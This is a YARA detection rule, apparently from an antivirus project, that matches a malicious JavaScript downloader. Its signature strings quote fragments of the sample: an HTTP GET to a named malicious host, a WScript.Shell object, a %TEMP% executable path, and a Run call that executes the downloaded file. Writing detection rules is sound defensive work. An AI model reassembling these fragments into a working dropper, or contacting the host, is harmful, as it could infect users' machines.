rule sig_20160401_7ffc316198768863743011105956109d {
  meta:
    description = "datamaliciousorder - file 20160401_7ffc316198768863743011105956109d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ff8656c5a00950ca92ed75a754a247439cb185e7fe4944a9b26f499d50a07fdc"

  strings:
    $s1  = "MtZd[JtUer](\"G\" + \"ET\", \"http://hotlinehomeappalinces.com/l2osa\", false);" fullword ascii
    $s2  = "function EhJnp(YqJvi, WssVbn){FomQac = FomQac * 1; return YqJvi - WssVbn;};" fullword ascii
    $s3  = "var AgAa = function EneZp() {return WScript[UeFg](\"WScript\"+\".Shell\");}(), TrTbg = 11;" fullword ascii
    $s4  = "if (MtZd[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function VhDq(){return ZhlCqe + \"\";};" fullword ascii
    $s6  = "function PrzJl() {return AgAa[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"JtQdmnXB.ex\" + \"e\";};" fullword ascii
    $s7  = "function NaWfj() {return ((SkuXrb == true) && (SkuXrb == BaeMw)) ? 1 : FomQac;};" fullword ascii
    $s8  = "var BaeMw = false;" fullword ascii
    $s9  = "return EhJnp(LatUv, BeIet);" fullword ascii
    $s10 = "function JgcJrw(LsBb) {var DdAm = (1, 2, 3, 4, 5, LsBb); return DdAm;};" fullword ascii
    $s11 = "BaeMw = true; " fullword ascii
    $s12 = "function FttQa(){return UeFg;};" fullword ascii
    $s13 = "var KikZni = new this[\"Date\"]();" fullword ascii
    $s14 = "function QmeXf(){return 23;};" fullword ascii
    $s15 = "function QikTjb(NqZj){AgAa[\"R\"+\"un\"](NqZj, FomQac, FomQac);};" fullword ascii
    $s16 = "function GlPfu()" fullword ascii
    $s17 = "}while (OquUsa);" fullword ascii
    $s18 = "var MlsRx = false;" fullword ascii
    $s19 = "SkuXrb = true; " fullword ascii
    $s20 = "var SkuXrb = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}